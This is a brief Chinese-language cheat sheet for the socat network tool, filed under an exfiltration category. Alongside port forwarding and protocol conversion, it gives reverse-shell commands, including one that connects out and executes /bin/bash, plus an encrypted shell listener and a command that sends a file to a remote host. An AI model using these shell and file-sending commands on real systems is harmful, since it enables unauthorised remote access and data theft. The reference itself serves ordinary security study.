# socat

## 简介
多功能网络工具，支持各种协议转换

## 核心参数
- 两个地址参数
- 支持 TCP、UDP、文件等

## 命令示例
```bash
# TCP 端口转发
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# 反向 shell（监听端）
socat TCP-LISTEN:4444 -

# 反向 shell（连接端）
socat TCP:192.168.1.100:4444 EXEC:/bin/bash

# 文件传输（接收端）
socat TCP-LISTEN:4444 OPEN:received_file.txt,creat

# 文件传输（发送端）
socat FILE:file.txt TCP:192.168.1.100:4444

# 加密 shell
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 -

# UDP 转 TCP
socat TCP-LISTEN:8080 UDP:192.168.1.100:53
```

## 使用场景
灵活的网络连接和协议转换

## 所属分类
- [数据渗出 (Exfiltration)](../categories/21-exfiltration.md)
